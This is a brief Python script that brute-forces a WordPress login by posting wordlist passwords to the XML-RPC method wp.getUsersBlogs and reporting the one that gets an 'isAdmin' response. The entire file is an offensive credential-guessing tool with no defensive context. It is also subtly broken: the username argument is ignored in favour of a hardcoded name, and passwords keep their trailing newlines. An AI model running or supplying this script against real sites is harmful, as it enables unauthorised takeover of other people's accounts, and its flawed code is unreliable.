import requests
import sys

url = sys.argv[1]
wordlist = open(sys.argv[2], "r", encoding="ISO-8859-1")
username = sys.argv[3]
print("Bruteforcing password, please wait...")
for i in wordlist:
	password = i
	xml = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>Nokline</value></param><param><value>'+password+'</value></param></params></methodCall>'
	req = requests.post (url, data = xml)
	if 'isAdmin' in req.text:
		print('the password is: ' + i)
		break
